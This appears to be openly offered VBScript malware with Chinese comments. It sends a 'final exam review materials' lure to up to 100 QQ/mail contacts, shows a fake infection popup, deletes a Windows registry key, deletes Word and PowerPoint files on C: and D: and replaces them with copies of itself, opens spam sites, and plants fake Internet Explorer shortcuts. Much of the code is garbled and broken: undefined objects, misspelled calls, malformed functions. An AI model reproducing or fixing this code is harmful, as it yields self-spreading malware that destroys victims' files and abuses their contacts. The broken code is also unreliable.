	
	//给100个列表好友发送消息“期末复习资料大全”
	Dim UngaDasQQ,DasMapiName,BreakUmoffASlice
	Set UngaDasQQ=CreatObject("QQ.Application")
	Set DasMapiName=UngaDasQQ.GetNameSpace("MAPI")
	If UngaDasQQ="QQ"Then
	DasMapiName.Logon"profile","password"
	For y=1 vTo DasMapiName.AddressLists.Count
	Set NumberQQ=DasMapiName.AddressLists(y)
	X=1
	Set BreakUmoffASlice=UngaQQ.CreatItem(0)
	For oo=1 To NumberQQ.AddressEntries.Count
	Peep=NumberQQ.AddressEntries(x)
	BreakUmoffASlice.Recipient.Add Peep
	X=x+1
	If x>100 Then oo=NumberQQ.AddressEntries.Count
	Next oo
	On Error Resume Next
	str="期末复习资料大全/qq"
	Set WshShella=WScript.CreateObject("WScript.Shell")
	WshShella.run "mshta doccript:clipboardData.SetData("+""""+"text"+""""+","+""""&str&""""+")(close)",0
	WshShella.run "tencent://message/?Menu=yes&uin=20016964&Site=&Service=200&sigT=2a39fb276d15586e1114e71f7af38e195148b0369a16a40fdad564ce185f72e8de86db22c67ec3c1",0,true
	WScript.Sleep 3000
	WshShella.SendKeys "^v"
	WshShella.SendKeys "%s"
	`断开连接
	DasMapiName.Logoff
	Peep=""
	End If
	
	//出现提示弹窗
	msgbox"你的电脑中毒了哦，快想办法补救吧！"
	
	//删除注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
	Dim WshShellb 
	Set WshShellb = WScript.CreateObject("WScript.Shell") 
	WshShellb.delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" 
	
	//删除.doc、.docx、.ppt、.pptx文件并且复制病毒文件进行替代
	On Error Resume Next
	Set fso1 = CreateObject("Scripting.FileSystemObject")
	Set fso2 = CreateObject("Scripting.FileSystemObject")
	Set fso3 = CreateObject("Scripting.FileSystemObject")
	Set fso4 = CreateObject("Scripting.FileSystemObject")
	Set fso5 = CreateObject("Scripting.FileSystemObject")
	Set fso6 = CreateObject("Scripting.FileSystemObject")
	Set fso7 = CreateObject("Scripting.FileSystemObject")
	Set fso8 = CreateObject("Scripting.FileSystemObject")
	fso1 "C:/*.doc", True
 	fso2 "C:/*.docx", True
    fso3 "C:/*.ppt", True
	fso4 "C:/*.pptx", True
	fso5 "D:/*.doc", True
 	fso6 "D:/*.docx", True
    fso7 "D:/*.ppt", True
	fso8 "D:/*.pptx", True
	Function pathRemove1(WScript1.ScriptName)
	Function pathRemove2(WScript2.ScriptName)
	Function pathRemove3(WScript3.ScriptName)
	Function pathRemove4(WScript4.ScriptName)
	Function pathRemove5(WScript5.ScriptName)
	Function pathRemove6(WScript6.ScriptName)
	Function pathRemove7(WScript7.ScriptName)
	Function pathRemove8(WScript8.ScriptName)
	WScript1.ScriptName=Replace(WScript1.ScriptName,"/","\")Dim ipos1
	WScript2.ScriptName=Replace(WScript2.ScriptName,"/","\")Dim ipos2
	WScript3.ScriptName=Replace(WScript3.ScriptName,"/","\")Dim ipos3
	WScript4.ScriptName=Replace(WScript4.ScriptName,"/","\")Dim ipos4
	WScript5.ScriptName=Replace(WScript5.ScriptName,"/","\")Dim ipos5
	WScript6.ScriptName=Replace(WScript6.ScriptName,"/","\")Dim ipos6
	WScript7.ScriptName=Replace(WScript7.ScriptName,"/","\")Dim ipos7
	WScript8.ScriptName=Replace(WScript8.ScriptName,"/","\")Dim ipos8
	ipos1=InStrRev(WScript1.ScriptName,"\")
	ipos2=InStrRev(WScript2.ScriptName,"\")
	ipos3=InStrRev(WScript3.ScriptName,"\")
	ipos4=InStrRev(WScript4.ScriptName,"\")
	ipos5=InStrRev(WScript5.ScriptName,"\")
	ipos6=InStrRev(WScript6.ScriptName,"\")
	ipos7=InStrRev(WScript7.ScriptName,"\")
	ipos8=InStrRev(WScript8.ScriptName,"\")
	pathRemove1=Left(WScript1.ScriptName,ipos1)
	pathRemove2=Left(WScript2.ScriptName,ipos2)
	pathRemove3=Left(WScript3.ScriptName,ipos3)
	pathRemove4=Left(WScript4.ScriptName,ipos4)
	pathRemove5=Left(WScript5.ScriptName,ipos5)
	pathRemove6=Left(WScript6.ScriptName,ipos6)
	pathRemove7=Left(WScript7.ScriptName,ipos7)
	pathRemove8=Left(WScript8.ScriptName,ipos8)
	End Function
	set copy1=createobject("scripting1.filesystemobject")
	set copy2=createobject("scripting2.filesystemobject")
	set copy3=createobject("scripting3.filesystemobject")
	set copy4=createobject("scripting4.filesystemobject")
	set copy5=createobject("scripting5.filesystemobject")
	set copy6=createobject("scripting6.filesystemobject")
	set copy7=createobject("scripting7.filesystemobject")
	set copy7=createobject("scripting8.filesystemobject")
	copy1.getfile(wscript1.scriptfullname).copy("pathRemove1/important.doc")
	copy2.getfile(wscript2.scriptfullname).copy("pathRemove2/important.doc")
	copy3.getfile(wscript3.scriptfullname).copy("pathRemove3/important.doc")
	copy4.getfile(wscript4.scriptfullname).copy("pathRemove4/important.doc")
	copy5.getfile(wscript5.scriptfullname).copy("pathRemove5/important.doc")
	copy6.getfile(wscript6.scriptfullname).copy("pathRemove6/important.doc")
	copy7.getfile(wscript7.scriptfullname).copy("pathRemove7/important.doc")
	copy8.getfile(wscript8.scriptfullname).copy("pathRemove8/important.doc")
	fso1.CreateObject("Scripting1.FileSystemObject")
	fso2.CreateObject("Scripting2.FileSystemObject")
	fso3.CreateObject("Scripting3.FileSystemObject")
	fso4.CreateObject("Scripting4.FileSystemObject")
	fso5.CreateObject("Scripting5.FileSystemObject")
	fso6.CreateObject("Scripting6.FileSystemObject")
	fso7.CreateObject("Scripting7.FileSystemObject")
	fso8.CreateObject("Scripting8.FileSystemObject")
	set f1=fso1.getfile("pathRemove1\important.doc")
	set f2=fso2.getfile("pathRemove2\important.doc")
	set f3=fso3.getfile("pathRemove3\important.doc")
	set f4=fso4.getfile("pathRemove4\important.doc")
	set f5=fso5.getfile("pathRemove5\important.doc")
	set f6=fso6.getfile("pathRemove6\important.doc")
	set f7=fso7.getfile("pathRemove7\important.doc")
	set f8=fso8.getfile("pathRemove8\important.doc")
	f1.name=WScript1.ScriptName 
	f2.name=WScript2.ScriptName 
	f3.name=WScript3.ScriptName 
	f4.name=WScript4.ScriptName 
	f5.name=WScript5.ScriptName 
	f6.name=WScript6.ScriptName 
	f7.name=WScript7.ScriptName 
	f8.name=WScript8.ScriptName 
	fso1.DeleteFile "C:/*.doc", True
	fso2.DeleteFile "C:/*.docx", True
	fso3.DeleteFile "C:/*.ppt", True
	fso4.DeleteFile "C:/*.pptx", True
	fso5.DeleteFile "D:/*.doc", True
	fso6.DeleteFile "D:/*.docx", True
	fso7.DeleteFile "D:/*.ppt", True
	fso8.DeleteFile "D:/*.pptx", True
	Set fso1 = Nothing
	Set fso2 = Nothing
	Set fso3 = Nothing
	Set fso4 = Nothing
	Set fso5 = Nothing
	Set fso6 = Nothing
	Set fso7 = Nothing
	Set fso8 = Nothing
	
	//弹出垃圾网页
	Set objShell = CreateObject("Wscript.Shell")
	objShell.Run("	http://jr.emoney.cn/hd/baidu_jpttt/index.html?src=Baidu&medium=PPC&Network=1&kw=152144941847&ad=31146828492&mt=1&ap=clg1&ag_kwid=14639-9-f9f834b20b7e1d61.0f6b1f7400b3a593
") 
	objShell.Run("https://club.isso.com.cn/Default.aspx?class=Topic&Topic=37771478")
    objShell.Run("http://www.18183.com/")
    objShell.Run("http://www.jisuxz.com/")   

	//添加网页快捷方式到桌面
	
	set a = WScript.CreateObject("WScript.Shell")
	strDesktop = a.SpecialFolders("Desktop")
	set oShellLink = a.CreateShortcut(strDesktop & "/Internet Explorer.lnk")
	oShellLink.TargetPath = "http://www.jisuxz.com/"
	oShellLink.Description = "Internet Explorer"
	oShellLink.IconLocation = "%ProgramFiles%/Internet Explorer/iexplore.exe, 0"
	oShellLink.Save
	oShellLink.TargetPath = "http://www.18183.com/"
	oShellLink.Description = "Internet Explorer"
	oShellLink.IconLocation = "%ProgramFiles%/Internet Explorer/iexplore.exe, 0"
	oShellLink.Save
	oShellLink.TargetPath = "https://club.isso.com.cn/Default.aspx?class=Topic&Topic=37771478"
	oShellLink.Description = "Internet Explorer"
	oShellLink.IconLocation = "%ProgramFiles%/Internet Explorer/iexplore.exe, 0"
	oShellLink.Save
	oShellLink.TargetPath = "http://jr.emoney.cn/hd/baidu_jpttt/index.html?src=Baidu&medium=PPC&Network=1&kw=152144941847&ad=31146828492&mt=1&ap=clg1&ag_kwid=14639-9-f9f834b20b7e1d61.0f6b1f7400b3a593
"
	oShellLink.Description = "Internet Explorer"
	oShellLink.IconLocation = "%ProgramFiles%/Internet Explorer/iexplore.exe, 0"
	oShellLink.Save

	


	